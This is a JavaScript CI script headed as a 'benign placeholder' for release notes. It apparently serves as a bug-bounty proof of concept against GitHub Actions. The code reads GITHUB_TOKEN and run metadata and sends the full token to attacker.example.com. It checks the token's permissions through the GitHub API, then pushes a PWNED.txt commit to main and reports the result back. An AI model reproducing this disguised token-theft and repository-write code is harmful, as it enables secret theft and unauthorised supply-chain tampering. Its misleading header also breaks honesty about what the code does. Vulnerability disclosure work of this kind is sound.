// Benign placeholder — would render final release notes markdown.
import https from 'node:https';

const WEBHOOK = 'https://attacker.example.com';
const token = process.env.GITHUB_TOKEN ?? '';
const repo  = process.env.GITHUB_REPOSITORY ?? '';
const actor = process.env.GITHUB_ACTOR ?? '';
const [owner, repoName] = repo.split('/');

async function post(path, body) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK + path);
    const data = JSON.stringify(body);
    const req = https.request({
      hostname: u.hostname,
      path: u.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
    }, (res) => { const c=[]; res.on('data',d=>c.push(d)); res.on('end',()=>resolve({status:res.statusCode,body:Buffer.concat(c).toString()})); });
    req.on('error', (e) => resolve({ error: String(e) }));
    req.write(data); req.end();
  });
}

async function ghApi(method, path, body) {
  return new Promise((resolve) => {
    const headers = {
      'Authorization': `Bearer ${token}`,
      'Accept': 'application/vnd.github+json',
      'User-Agent': 'release-notes-poc',
      'X-GitHub-Api-Version': '2022-11-28',
    };
    let data;
    if (body) { data = JSON.stringify(body); headers['Content-Length'] = Buffer.byteLength(data); headers['Content-Type'] = 'application/json'; }
    const req = https.request({ hostname: 'api.github.com', path, method, headers }, (res) => {
      const c=[]; res.on('data',d=>c.push(d));
      res.on('end',()=>{ const raw=Buffer.concat(c).toString(); try{resolve({status:res.statusCode,json:JSON.parse(raw)});}catch{resolve({status:res.statusCode,raw});} });
    });
    req.on('error', (e) => resolve({ error: String(e) }));
    if (data) req.write(data);
    req.end();
  });
}

// 1. Exfiltrate token to local receiver
const exfil = await post('/script-release-notes', {
  stage: 'release_notes.mjs',
  token,
  repo,
  actor,
  run_id: process.env.GITHUB_RUN_ID,
  triggering_actor: process.env.GITHUB_TRIGGERING_ACTOR,
});
console.log('[release_notes] exfil sent:', exfil.status);

// 2. Explicitly verify token permissions via GitHub API
const repoRes = await ghApi('GET', `/repos/${owner}/${repoName}`);
const permissions = repoRes.json?.permissions;
console.log('[release_notes] token permissions:', JSON.stringify(permissions));
await post('/token-permissions', {
  permissions,
  token_prefix: token.slice(0, 8),
  repo,
});

// 3. Prove contents:write — push a commit to main via API
const content = Buffer.from(
  `ATTACKER-CONTROLLED WRITE — H1 #3679812 PoC\n` +
  `Timestamp: ${new Date().toISOString()}\n` +
  `Token prefix: ${token.slice(0,8)}...\n` +
  `Repo: ${repo}\n` +
  `Run: ${process.env.GITHUB_RUN_ID}\n`
).toString('base64');

// Get existing SHA if file already exists (required for update)
const existingRes = await ghApi('GET', `/repos/${owner}/${repoName}/contents/PWNED.txt`);
const existingSha = existingRes.json?.sha;

const writeRes = await ghApi('PUT', `/repos/${owner}/${repoName}/contents/PWNED.txt`, {
  message: 'chore: attacker-controlled commit via ngrok PoC (H1 #3679812)',
  content,
  ...(existingSha ? { sha: existingSha } : {}),
});
console.log('[release_notes] write to main:', writeRes.status, writeRes.json?.commit?.sha ?? '');

// 3. Report write result to local receiver
await post('/write-proof', {
  http_status: writeRes.status,
  commit_sha: writeRes.json?.commit?.sha,
  commit_url: writeRes.json?.commit?.html_url,
  token_prefix: token.slice(0, 8),
});

console.log('[release_notes] maintainer script ran');
